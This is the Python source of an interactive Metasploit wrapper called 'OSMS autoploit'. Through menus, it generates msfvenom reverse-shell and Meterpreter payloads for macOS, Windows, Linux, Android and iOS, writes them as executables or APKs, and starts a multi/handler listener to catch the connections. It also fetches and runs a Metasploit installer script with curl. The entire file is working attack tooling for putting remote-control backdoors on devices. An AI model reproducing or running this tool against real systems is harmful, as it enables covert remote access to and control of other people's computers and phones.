import sys, os, time

if sys.platform in ["linux","linux2"]:
	W = "\033[0m"
	R = "\033[31;1m"
	G = "\033[32;1m"
	Y = "\033[33;1m"
	B = "\033[34;1m"
	P = "\033[35;1m"
	C = "\033[36;1m"

else:
	W = ""
	R = ""
	G = ""
	Y = ""
	B = ""
	P = ""
	C = ""

def https(comm,lh,lp,out):
	macbin = "osx/x86/shell_reverse_https"
	winbin = "windows/meterpreter/reverse_https"
	linbin = "linux/x86/meterpreter/reverse_https"
	andbin = "android/meterpreter/reverse_https"
	iosbin = "apple_ios/aarch64/meterpreter_reverse_https"

	print("%s[%s1%s] macOS"%(W,G,W))
	print("%s[%s2%s] windows"%(W,G,W))
	print("%s[%s3%s] linux"%(W,G,W))
	print("%s[%s4%s] android"%(W,G,W))
	print("%s[%s5%s] Ios"%(W,G,W))
	i = input("%sOSMS%s@%sautoploit%s ~# "%(R,Y,G,W))

	if i == "1":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f macho > %s.macho"%(comm,macbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,macbin,lh,lp))

	if i == "2":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s.exe"%(comm,winbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,winbin,lh,lp))

	if i == "3":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f elf > %s.elf"%(comm,linbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,linbin,lh,lp))

	if i == "4":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s R > %s.apk"%(comm,andbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,andbin,lh,lp))

	if i == "5":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f macho > %s.macho"%(comm,iosbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,iosbin,lh,lp))

	back()

def back():
	print("[?] did you want back main menu(y/n)")
	j = input("%sOSMS%s@%sautoploit%s ~# "%(R,Y,G,W))
	if j == "y" or j == "Y":
		main()
	else:
		exit()

def http(comm,lh,lp,out):
	macbin = "osx/x86/shell_reverse_http"
	winbin = "windows/meterpreter/reverse_http"
	linbin = "linux/x86/meterpreter/reverse_http"
	andbin = "android/meterpreter/reverse_http"
	iosbin = "apple_ios/aarch64/meterpreter_reverse_http"

	print("%s[%s1%s] macOS"%(W,G,W))
	print("%s[%s2%s] windows"%(W,G,W))
	print("%s[%s3%s] linux"%(W,G,W))
	print("%s[%s4%s] android"%(W,G,W))
	print("%s[%s5%s] Ios"%(W,G,W))
	h = input("%sOSMS%s@%sautoploit%s ~# "%(R,Y,G,W))

	if h == "1":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f macho > %s.macho"%(comm,macbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,macbin,lh,lp))

	if h == "2":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s.exe"%(comm,winbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,winbin,lh,lp))

	if h == "3":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f elf > %s.elf"%(comm,linbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,linbin,lh,lp))

	if h == "4":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s R > %s.apk"%(comm,andbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,andbin,lh,lp))

	if h == "5":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f macho > %s.macho"%(comm,iosbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,iosbin,lh,lp))

	back()

def tcp(comm,lh,lp,out):
	macbin = "osx/x86/shell_reverse_tcp"
	winbin = "windows/meterpreter/reverse_tcp"
	linbin = "linux/x86/meterpreter/reverse_tcp"
	andbin = "android/meterpreter/reverse_tcp"
	iosbin = "apple_ios/aarch64/meterpreter_reverse_tcp"

	print("%s[%s1%s] macOS"%(W,G,W))
	print("%s[%s2%s] windows"%(W,G,W))
	print("%s[%s3%s] linux"%(W,G,W))
	print("%s[%s4%s] android"%(W,G,W))
	print("%s[%s5%s] Ios"%(W,G,W))
	g = input("%sOSMS%s@%sautoploit%s ~# "%(R,Y,G,W))
	if g == "1":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f macho > %s.macho"%(comm,macbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,macbin,lh,lp))

	if g == "2":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f exe > %s.exe"%(comm,winbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,winbin,lh,lp))

	if g == "3":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f elf > %s.elf"%(comm,linbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,linbin,lh,lp))

	if g == "4":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s R > %s.apk"%(comm,andbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,andbin,lh,lp))

	if g == "5":
		shell = "%s msfvenom -p %s LHOST=%s LPORT=%s -f macho > %s.macho"%(comm,iosbin,lh,lp,out)
		print("[*] creating payload...")
		os.system(shell)
		print("[*] payload created")
		h = input("[?] Did you want exploit now(y/n) ?")
		if h == "y" or h == "Y":
			os.system('%s msfconsole -q -x "use exploit/multi/handler ; set payload %s ; set LHOST %s ; set LPORT %s ; run"'%(comm,iosbin,lh,lp))		

	back()

def msfvenom(a,lh,lp,out):
	if a == "1":
		comm = ""
	else:
		comm = "sudo "
	
	print("%s[%s1%s] reverse tcp"%(W,G,W))
	print("%s[%s2%s] reverse http"%(W,G,W))
	print("%s[%s3%s] reverse https"%(W,G,W))
	f = input("%sOSMS%s@%sautoploit%s ~# "%(R,Y,G,W))
	if f == "1":
		tcp(comm,lh,lp,out)

	if f == "2":
		http(comm,lh,lp,out)

	if f == "3":
		https(comm,lh,lp,out)

def main():
	logo = """%s
 ██████╗ ███████╗███╗   ███╗███████╗ 
██╔═══██╗██╔════╝████╗ ████║██╔════╝ 
██║   ██║███████╗██╔████╔██║███████╗ %s
██║   ██║╚════██║██║╚██╔╝██║╚════██║ 
╚██████╔╝███████║██║ ╚═╝ ██║███████║ 
 ╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝ 
%s   open source metasploit script 
%s   V.0.1 beta %s(c) 2018-2020 %smr4fun
%s	"""%(R,W,B,G,Y,R,W)
	try:
			save = open("ip.txt", "r").read()
			save2 = open("port.txt", "r").read()
	except IOError:
		next
	os.system("clear")
	print("[?] choice your os ?")
	print("[1] termux")
	print("[2] linux")
	a = input("OSMS@autoploit ~# ")
	if a == "1" or a == "2":
		if a == "1":
			OS = "termux/android"
			comm = ""
		else:
			OS = "linux"
			comm = "sudo "

		os.system("clear")
		print(logo)
		print("%s[%s info%s ] selected os %s%s%s"%(W,G,W,Y,OS,W))
		print("%s[%s1%s] create payload (%smsfvenom%s)"%(W,G,W,Y,W))
		print("%s[%s2%s] launch metasploit (%smsfconsole%s) not automatically"%(W,G,W,Y,W))
		print("%s[%s3%s] check the ip address (%sifconfig%s)"%(W,G,W,Y,W))
		print("%s[%s4%s] install metasploit"%(W,G,W))
		b = input("%sOSMS%s@%sautoploit%s ~# "%(R,Y,G,W))
		if b == "1":
			print("%s[%s~%s] default LPORT %s444%s, %s445%s, %s4444%s"%(W,Y,W,G,W,G,W,G,W))
			c = input("%s[%s*%s] input local host(LHOST) : "%(W,R,W))
			d = input("%s[%s*%s] input local port(LPORT) : "%(W,R,W))
			print("%sexample %spayload%s , please no %sextension(*.apk)%s"%(W,G,W,R,W))
			e = input("%s[%s*%s] output payload name : "%(W,R,W))
			msfvenom(a,c,d,e)
		if b == "2":
			os.system('%s msfconsole -q -x "use exploit/multi/handler"'%(comm))
		if b == "3":
			os.system("%s apt install net-tools"%(comm))
			os.system("ifconfig")
		if b == "4":
			if a == "1":
				os.system("apt install unstable-repo -y")
				os.system("apt install metasploit -y")
			if a == "2":
				os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall")
				os.system("chmod 755 msfinstall")
				os.system("./msfinstall")
try:
	if sys.version[0] in "3":
		main()

	else:
		print("%s[%s!%s] please use python version 3"%(W,R,W))
except KeyboardInterrupt:
	os.system("clear")
	exit()